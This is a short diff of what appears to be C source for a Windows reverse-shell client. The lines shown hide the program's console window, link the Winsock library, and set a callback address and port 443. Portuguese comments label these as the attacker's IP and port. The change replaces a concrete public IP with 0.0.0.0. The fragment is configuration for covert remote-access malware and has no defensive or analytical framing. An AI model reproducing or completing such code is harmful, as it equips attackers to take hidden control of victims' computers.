@@ -6,7 +6,7 @@
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib, "ws2_32.lib")
 
-#define CLIENT_IP "45.190.52.123"    // ALTERAR PARA IP DO ATACANTE
+#define CLIENT_IP "0.0.0.0"    // ALTERAR PARA IP DO ATACANTE
 #define CLIENT_PORT 443         // ALTERAR PARA PORTA DO ATACANTE
 #define BUFFER_SIZE 4096
 
